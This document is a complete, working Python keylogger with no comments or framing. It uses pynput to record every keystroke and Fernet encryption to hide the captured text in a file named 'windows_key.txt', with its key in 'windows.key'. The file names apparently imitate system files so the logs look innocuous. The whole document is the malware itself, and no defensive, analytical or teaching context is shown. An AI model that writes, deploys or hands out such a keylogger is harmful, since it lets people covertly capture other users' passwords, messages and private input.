from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os

def generate_key():
    if not os.path.exists("windows.key"):
        key = Fernet.generate_key()
        with open("windows.key", "wb") as key_file:
            key_file.write(key)

def load_key():
    try:
        return open("windows.key", "rb").read()
    except FileNotFoundError:
        generate_key()
        return open("windows.key", "rb").read()

def encrypt_and_log(buffer):
    key = load_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt("".join(buffer).encode())
    with open("windows_key.txt", "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

buffer = []
buffer_size = 10

def write_buffer():
    if buffer:
        encrypt_and_log(buffer)
        buffer.clear()

def on_press(key):
    global buffer
    try:
        if key == Key.enter:
            buffer.append("\n")
        elif key in {Key.space, Key.tab, Key.backspace}:
            buffer.append(f'[{key}]')
        else:
            buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key}]')

    if len(buffer) >= buffer_size:
        write_buffer()

def on_release(key):
    if key == Key.esc:
        write_buffer()
        return False

generate_key()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
